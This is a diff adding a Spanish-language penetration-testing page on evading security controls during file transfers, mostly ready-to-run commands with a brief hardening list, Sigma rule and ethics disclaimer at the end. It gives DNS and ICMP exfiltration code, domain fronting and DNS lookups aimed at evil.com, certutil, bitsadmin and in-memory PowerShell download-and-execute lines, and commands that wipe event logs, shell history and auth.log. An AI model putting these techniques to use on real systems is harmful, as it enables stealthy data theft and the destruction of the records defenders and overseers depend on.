@@ -1,0 +1,300 @@
+# Evasión de Detección
+
+Técnicas para evadir controles de seguridad durante transferencias de archivos.
+
+## Técnicas de Evasión
+
+### Ofuscación de URLs
+
+**Codificación:**
+
+```bash
+# URL encoding
+wget http://192.168.1.100/%66%69%6c%65.txt
+
+# Hex encoding en path
+curl http://192.168.1.100/\x66\x69\x6c\x65.txt
+
+# Double encoding
+wget http://192.168.1.100/%252566%252569%25256c%252565.txt
+```
+
+### Domain Fronting
+
+```bash
+# Usar CDN como proxy
+curl -H "Host: evil.com" https://cdn.cloudflare.com/file.txt
+
+# Con certificados válidos
+wget --header="Host: evil.com" https://cdn.cloudflare.com/file.txt
+```
+
+### Steganografía
+
+**Ocultar archivo en imagen:**
+
+```bash
+# Crear archivo oculto
+cp image.jpg secret.jpg
+zip secret.zip payload.exe
+cat secret.zip >> secret.jpg
+
+# Extraer
+unzip secret.jpg
+```
+
+**Con steghide:**
+
+```bash
+# Incrustar
+steghide embed -cf image.jpg -ef secret.txt -p password
+
+# Extraer
+steghide extract -sf image.jpg -p password
+```
+
+### Segmentación de archivos
+
+```bash
+# Dividir archivo
+split -b 500K payload.exe chunk_
+
+# Transferir en partes
+for f in chunk_*; do
+    curl -X POST -F "file=@$f" http://192.168.1.100/upload/
+done
+
+# Reconstruir
+cat chunk_* > payload.exe
+```
+
+## Evasión de Antivirus
+
+### Living Off The Land
+
+**Usar binarios firmados:**
+
+```cmd
+:: certutil firmado por Microsoft
+certutil -urlcache -split -f http://192.168.1.100/file.txt file.txt
+
+:: bitsadmin firmado
+bitsadmin /transfer job /download /priority normal http://192.168.1.100/file.txt C:\Temp\file.txt
+```
+
+### Encoding y Compression
+
+```bash
+# Base64 encode
+base64 payload.exe > payload.b64
+
+# Transferir
+curl http://192.168.1.100/payload.b64 -o payload.b64
+
+# Decodificar en destino
+base64 -d payload.b64 > payload.exe
+```
+
+**PowerShell:**
+
+```powershell
+# Download y decode en memoria
+$data = (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.b64')
+[IO.File]::WriteAllBytes('payload.exe', [Convert]::FromBase64String($data))
+```
+
+### Archivos compressados
+
+```bash
+# Comprimir con contraseña
+7z a -psecret archive.7z payload.exe
+
+# Transferir
+curl -T archive.7z http://192.168.1.100/upload/
+
+# Extraer
+7z x -psecret archive.7z
+```
+
+## Evasión de Detección de Red
+
+### Puertos no estándar
+
+```bash
+# HTTP en puerto no estándar
+curl http://192.168.1.100:8443/file.txt
+
+# Servidor en puerto altern
+python3 -m http.server 8443
+```
+
+### Protocolos alternativos
+
+**DNS exfiltration:**
+
+```bash
+# Codificar datos en subdomain
+data=$(cat file.txt | xxd -p)
+for chunk in $(echo $data | fold -w 30); do
+    nslookup $chunk.evil.com
+done
+```
+
+**ICMP exfiltration:**
+
+```python
+#!/usr/bin/env python3
+import sys
+from scapy.all import *
+
+target = sys.argv[1]
+data = open(sys.argv[2], 'rb').read()
+
+for i in range(0, len(data), 32):
+    chunk = data[i:i+32]
+    send(IP(dst=target)/ICMP()/(chunk))
+```
+
+### Timing Evasion
+
+```bash
+# Transferir con delays
+for chunk in chunk_*; do
+    curl -X POST -F "file=@$chunk" http://192.168.1.100/upload/
+    sleep $((RANDOM % 60))
+done
+```
+
+## Evasión de Blue Team
+
+### Limpiar rastros
+
+**Windows:**
+
+```cmd
+:: Limpiar caché de certutil
+certutil -urlcache -split -f http://192.168.1.100/file.txt delete
+
+:: Limpiar historial de PowerShell
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+
+:: Limpiar eventos
+wevtutil cl "Windows PowerShell"
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+```
+
+**Linux:**
+
+```bash
+# Limpiar historial
+history -c
+cat /dev/null > ~/.bash_history
+
+# Limpiar logs (requiere root)
+echo "" > /var/log/auth.log
+```
+
+### Anti-forensics
+
+```bash
+# Sobrescribir timestamps
+touch -r /bin/ls evil_file
+
+# Usar memoria volátil
+# Cargar payload directamente en memoria sin tocar disco
+
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
+```
+
+## Técnicas Avanzadas
+
+### Polimorfismo
+
+```bash
+# Script que modifica su propio código
+#!/bin/bash
+self=$(readlink -f $0)
+sed -i "s/^# Random:.*/# Random: $RANDOM/" $self
+# Payload aquí
+```
+
+### Domain Generation Algorithm (DGA)
+
+```python
+#!/usr/bin/env python3
+import hashlib
+from datetime import datetime
+
+seed = datetime.now().strftime("%Y-%m-%d")
+for i in range(10):
+    domain = hashlib.md5((seed + str(i)).encode()).hexdigest()[:12] + ".com"
+    print(domain)
+```
+
+### CDN y Cloud Storage
+
+```bash
+# Usar servicios legítimos
+# GitHub, Dropbox, Google Drive, Pastebin
+
+curl -L https://pastebin.com/raw/xxxxx > payload.sh
+curl -L https://raw.githubusercontent.com/user/repo/main/payload.sh > payload.sh
+```
+
+## Contramedidas
+
+### Hardening
+
+1. **Application Whitelisting:** Solo permitir binarios firmados y aprobados
+2. **Network Segmentation:** Limitar acceso a Internet
+3. **Proxy Inspection:** Inspeccionar todo tráfico HTTPS
+4. **DLP:** Data Loss Prevention para detectar exfiltración
+5. **EDR/XDR:** Detección comportamental
+
+### Detección Mejorada
+
+```yaml
+# Sigma rule para detección
+title: Suspicious Certutil Download
+status: experimental
+logsource:
+    product: windows
+    service: sysmon
+detection:
+    selection:
+        EventID: 1
+        Image|contains: certutil.exe
+        CommandLine|contains:
+            - '-urlcache'
+            - '-split'
+            - '-f'
+    condition: selection
+falsepositives:
+    - Legitimate administrator activity
+level: high
+```
+
+## Resumen
+
+| Técnica | Dificultad | Detección |
+|---------|------------|-----------|
+| URL Encoding | Baja | Media |
+| Domain Fronting | Media | Baja |
+| Steganography | Media | Baja |
+| LOLBins | Baja | Media-Alta |
+| DNS Exfil | Alta | Media |
+| Timing Evasion | Media | Baja |
+| Anti-forensics | Alta | N/A |
+
+---
+
+## Consideraciones Éticas
+
+> **⚠️ Advertencia:** Este conocimiento debe usarse exclusivamente para:
+> 
+> - Pentesting autorizado
+> - Red team exercises con aprobación
+> - Análisis defensivo y blue team
+> - Investigación de seguridad
+> 
+> El uso no autorizado de estas técnicas es ilegal y puede resultar en consecuencias legales severas.
